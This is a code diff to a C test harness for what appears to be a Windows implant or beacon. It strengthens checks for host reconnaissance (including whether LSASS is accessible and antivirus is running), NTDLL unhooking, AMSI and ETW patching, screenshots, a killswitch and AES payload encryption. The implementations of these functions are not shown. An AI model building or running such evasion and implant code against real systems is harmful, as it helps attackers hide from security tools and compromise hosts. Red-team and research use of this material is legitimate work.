@@ -73,7 +73,7 @@ int main() {
   // Decode XOR'd config strings before any tests use them
   beacon_decode_config();
 
-  // ── Test 1: Recon ─────────────────────────────────────────
+  // ── Test 1: Recon + Schema Validation ──────────────────────
   printf("[TEST 1] Recon\n");
   CHECKIN_INFO info = {0};
   recon_collect(&info);
@@ -83,8 +83,34 @@ int main() {
   DWORD len = 0;
   recon_serialize(&info, &json, &len);
   printf("[TEST 1] JSON (%lu bytes):\n%s\n\n", len, json);
+
+  // Schema validation — verify all 18 required AgentFindings fields
+  {
+    const CHAR *requiredFields[] = {
+      "\"os\"", "\"privilege_level\"", "\"open_ports\"",
+      "\"running_services\"", "\"domain_joined\"", "\"active_directory\"",
+      "\"antivirus_running\"", "\"lsass_accessible\"", "\"ntlm_auth\"",
+      "\"current_kill_chain_phase\"", "\"hostname\"", "\"username\"",
+      "\"os_version\"", "\"pid\"", "\"arch\"", "\"ip\"",
+      "\"is_debugged\"", "\"is_vm\"", NULL
+    };
+    int fieldCount = 0;
+    BOOL schemaOk = TRUE;
+    for (int i = 0; requiredFields[i]; i++) {
+      fieldCount++;
+      if (!strstr(json, requiredFields[i])) {
+        printf("  [!] MISSING field: %s\n", requiredFields[i]);
+        schemaOk = FALSE;
+      }
+    }
+    printf("  Schema: %d/%d fields present — %s\n",
+           schemaOk ? fieldCount : fieldCount - 1, fieldCount,
+           schemaOk ? "SCHEMA OK" : "SCHEMA FAIL");
+    printf("  Ports: %lu  Services: %lu\n", info.port_count, info.service_count);
+    if (schemaOk && len > 0 && info.port_count > 0) passed++;
+    else failed++;
+  }
   HeapFree(GetProcessHeap(), 0, json);
-  passed++;
 
   // ── Test 2: Anti-analysis ─────────────────────────────────
   printf("[TEST 2] Anti-analysis (SKIPPED ExitProcess in test mode)\n");
@@ -93,15 +119,22 @@ int main() {
 
   // ── Test 3: Evasion ───────────────────────────────────────
   printf("[TEST 3] NTDLL unhook\n");
-  if (!unhook_ntdll())
+  BOOL unhookOk = unhook_ntdll();
+  if (!unhookOk)
     printf("[!] unhook_ntdll failed\n");
 
   printf("[TEST 3] AMSI patch\n");
-  patch_amsi();
+  BOOL amsiOk = patch_amsi();
 
   printf("[TEST 3] ETW patch\n");
-  patch_etw();
-  passed++;
+  BOOL etwOk = patch_etw();
+
+  printf("  NTDLL: %s  AMSI: %s  ETW: %s\n",
+         unhookOk ? "OK" : "FAIL",
+         amsiOk ? "OK" : "FAIL",
+         etwOk ? "OK" : "FAIL");
+  if (unhookOk && amsiOk && etwOk) passed++;
+  else failed++;
 
   // ── Test 4: Screenshot ────────────────────────────────────
   printf("\n[TEST 4] Screenshot\n");
@@ -123,12 +156,14 @@ int main() {
 
   // ── Test 7: Killswitch ────────────────────────────────────
   printf("\n[TEST 7] killswitch\n");
-  printf("  soft kill active: %s\n", killswitch_is_active() ? "YES" : "NO");
+  BOOL beforeKill = killswitch_is_active();
+  printf("  soft kill active (before): %s\n", beforeKill ? "YES" : "NO");
   killswitch_soft();
-  printf("[!] KILLSWITCH: soft kill — beacon going dormant\n");
-  printf("  after killswitch_soft: %s\n",
-         killswitch_is_active() ? "YES" : "NO");
-  passed++;
+  BOOL afterKill = killswitch_is_active();
+  printf("  soft kill active (after):  %s\n", afterKill ? "YES" : "NO");
+  // Document: initial FALSE, post-activation TRUE
+  if (!beforeKill && afterKill) { printf("  PASS\n"); passed++; }
+  else { printf("  FAIL\n"); failed++; }
 
   // ── Test 8: AES roundtrip ────────────────────────────────
   printf("\n[TEST 8] AES roundtrip\n");
@@ -140,20 +175,26 @@ int main() {
 
   if (aes_encrypt_payload((PBYTE)plaintext, (DWORD)strlen(plaintext), &pCipher,
                           &cipherLen)) {
-    printf("  Encrypted: %lu bytes\n", cipherLen);
+    printf("  Encrypted: %lu bytes (expected 32)\n", cipherLen);
     if (aes_decrypt_payload((PBYTE)pCipher, cipherLen, &pDecrypt,
                             &decryptLen)) {
       printf("  Decrypted: %.*s\n", decryptLen, (CHAR *)pDecrypt);
-      printf("  Match: %s\n",
-             memcmp(pDecrypt, plaintext, strlen(plaintext)) == 0 ? "PASS"
-                                                                 : "FAIL");
+      BOOL sizeOk = (cipherLen == 32 && decryptLen == 18);
+      BOOL matchOk = (memcmp(pDecrypt, plaintext, strlen(plaintext)) == 0);
+      printf("  Size check (18→32→18): %s\n", sizeOk ? "PASS" : "FAIL");
+      printf("  Content match: %s\n", matchOk ? "PASS" : "FAIL");
+      if (sizeOk && matchOk) passed++;
+      else failed++;
       HeapFree(GetProcessHeap(), 0, pDecrypt);
+    } else {
+      printf("[!] aes_decrypt_payload failed\n");
+      failed++;
     }
     HeapFree(GetProcessHeap(), 0, pCipher);
   } else {
     printf("[!] aes_encrypt_payload failed\n");
+    failed++;
   }
-  passed++;
 
   // ============================================================
   // NEW TEST CASES — Browser, NTDLL, Evasion
